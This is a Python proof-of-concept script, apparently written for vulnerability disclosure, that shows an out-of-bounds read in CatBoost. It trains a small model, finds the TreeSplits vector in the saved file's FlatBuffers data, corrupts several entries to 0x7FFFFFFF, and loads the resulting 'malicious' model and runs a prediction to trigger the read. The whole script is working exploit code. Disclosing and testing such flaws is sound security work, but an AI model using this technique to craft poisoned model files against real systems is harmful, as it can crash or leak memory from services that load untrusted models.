"""
PoC: CatBoost Model Tree OOB Read via Unvalidated TreeSplits
Demonstrates that TreeSplits values are used as array indices
without bounds checking in CalcBinFeatures().
"""
import catboost
import struct
import tempfile
import os
import numpy as np

print(f"CatBoost version: {catboost.__version__}")

# Step 1: Create a valid model (numeric features only — no CTR tables)
from catboost import CatBoostClassifier

np.random.seed(42)
X = np.random.rand(200, 4)
y = np.random.randint(0, 2, 200)

model = CatBoostClassifier(iterations=10, depth=4, verbose=0, random_seed=42)
model.fit(X, y)

valid_path = tempfile.mktemp(suffix='.cbm')
model.save_model(valid_path)
print(f"Valid model saved: {valid_path}")

# Step 2: Read model file
with open(valid_path, 'rb') as f:
    data = bytearray(f.read())

print(f"Model file size: {len(data)} bytes")

# Parse header
size_marker = struct.unpack('<I', data[4:8])[0]
if size_marker == 0xFFFFFFFF:
    core_size = struct.unpack('<Q', data[8:16])[0]
    fb_start = 16
else:
    core_size = size_marker
    fb_start = 8

print(f"FlatBuffers core: [{fb_start}, {fb_start + core_size})")
fb_data = data[fb_start:fb_start + core_size]

# Step 3: Find TreeSplits vector in FlatBuffers data
# TreeSplits is a vector of int32 values representing bin feature indices
# For a model with 4 float features and depth 4, TreeSplits values should be
# in range [0, total_bin_features). We look for int32 vectors with small values.

candidates = []
for offset in range(4, len(fb_data) - 20, 4):
    vec_len = struct.unpack('<I', fb_data[offset:offset+4])[0]
    # TreeSplits for 10 trees of depth 4 = ~40 elements
    if 10 <= vec_len <= 200:
        valid = True
        values = []
        for i in range(min(vec_len, 10)):
            if offset + 4 + (i+1)*4 > len(fb_data):
                valid = False
                break
            val = struct.unpack('<i', fb_data[offset+4+i*4:offset+8+i*4])[0]
            values.append(val)
            if val < 0 or val > 500:
                valid = False
                break
        if valid and len(values) >= 10:
            candidates.append((offset, vec_len, values))

print(f"\nFound {len(candidates)} potential TreeSplits vectors:")
for off, length, vals in candidates:
    print(f"  Offset {off}: length={length}, first values={vals[:10]}")

if not candidates:
    print("ERROR: Could not locate TreeSplits vector")
    os.unlink(valid_path)
    exit(1)

# Use the first candidate (most likely TreeSplits)
target_offset, target_len, original_values = candidates[0]
print(f"\nTargeting TreeSplits at offset {target_offset}, length={target_len}")
print(f"Original values (first 10): {original_values}")

# Step 4: Corrupt TreeSplits values to large indices
corrupted_data = bytearray(data)
fb_abs_offset = fb_start + target_offset

# Set first TreeSplit value to a very large index (0x7FFFFFFF)
# This should cause OOB read in CalcBinFeatures at:
#   ref.BinFeatures[binSplit]  and  splitIds[binSplit]
corrupt_value = 0x7FFFFFFF  # Way beyond BinFeatures.size()
struct.pack_into('<i', corrupted_data, fb_abs_offset + 4, corrupt_value)
print(f"Corrupted first TreeSplit value to: {corrupt_value}")

# Also try corrupting multiple values
for i in range(min(3, target_len)):
    struct.pack_into('<i', corrupted_data, fb_abs_offset + 4 + i*4, 0x7FFFFFFF)

malicious_path = tempfile.mktemp(suffix='.cbm')
with open(malicious_path, 'wb') as f:
    f.write(corrupted_data)
print(f"Malicious model saved: {malicious_path}")

# Step 5: Load the corrupted model
# This should trigger OOB read in CalcBinFeatures() during UpdateRuntimeData()
print("\n--- Loading corrupted model ---")
try:
    bad_model = CatBoostClassifier()
    bad_model.load_model(malicious_path)
    print("WARNING: Model loaded without error — OOB read occurred silently!")
    print("Run with AddressSanitizer (ASan) to confirm heap-buffer-overflow")

    # Try prediction to trigger further OOB in Apply
    try:
        pred = bad_model.predict(X[:1])
        print(f"Prediction: {pred} — further OOB likely occurred")
    except Exception as e:
        print(f"Prediction error: {e}")

except Exception as e:
    error_msg = str(e)
    print(f"Error during load: {e}")
    if "Flatbuffers" in error_msg:
        print("NOTE: FlatBuffers verification caught the corruption")
        print("This is expected — the Verifier checks structure, not values")
        print("The TreeSplits VALUE corruption should bypass the Verifier")
    elif "segfault" in error_msg.lower() or "signal" in error_msg.lower():
        print("CONFIRMED: Segfault — OOB read crash")
    else:
        print("Loading failed — may be OOB crash caught as exception")

# Cleanup
os.unlink(valid_path)
os.unlink(malicious_path)
print("\nDone.")
